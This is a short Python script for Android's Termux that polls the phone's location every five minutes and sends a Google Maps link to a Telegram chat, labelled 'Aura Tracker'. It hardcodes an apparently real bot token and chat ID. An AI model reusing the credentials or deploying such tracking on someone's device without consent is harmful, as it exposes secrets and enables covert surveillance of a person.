import subprocess
import time
import json
import logging
import requests

# --- ВАШИ ДАННЫЕ ---
BOT_TOKEN = "8250645018:AAG0NTcU2XQPYdjmwYE3jBN3dxRfvD_I1vM"
CHAT_ID = "-1003578591855" 
INTERVAL = 300  # 5 минут (300 секунд)

# Настройка логов
logging.basicConfig(
    filename="geo_log.txt",
    level=logging.INFO,
    format="%(asctime)s %(message)s",
    datefmt="%H:%M:%S"
)

def get_location():
    """Получает координаты через Termux API (network = экономия батареи)"""
    try:
        # -p network: использует Wi-Fi и вышки, работает в помещении
        result = subprocess.run(
            ["termux-location", "-p", "network", "-r", "last"],
            capture_output=True,
            text=True,
            timeout=30
        )
        if result.returncode == 0:
            data = json.loads(result.stdout)
            return data["latitude"], data["longitude"]
        else:
            logging.error(f"Ошибка termux-location: {result.stderr}")
            return None, None
    except Exception as e:
        logging.error(f"Сбой вызова: {e}")
        return None, None

def send_to_telegram(lat, long):
    try:
        # Ссылка сразу открывает точку на карте
        maps_link = f"https://www.google.com/maps/search/?api=1&query={lat},{long}"
        
        message = f"📍 <b>Геолокация Aura</b>\n{maps_link}"
        
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": CHAT_ID,
            "text": message,
            "parse_mode": "HTML",
            "disable_web_page_preview": False
        }
        
        resp = requests.post(url, json=payload, timeout=10)
        if resp.status_code != 200:
            logging.error(f"Ошибка Telegram: {resp.text}")
            
    except Exception as e:
        logging.error(f"Ошибка сети: {e}")

def main():
    # Сообщение о запуске (чтобы проверить связь)
    try:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={"chat_id": CHAT_ID, "text": "🛰️ Aura Tracker: Мониторинг запущен"}
        )
    except:
        pass

    while True:
        lat, long = get_location()
        if lat and long:
            send_to_telegram(lat, long)
        
        time.sleep(INTERVAL)

if __name__ == "__main__":
    main()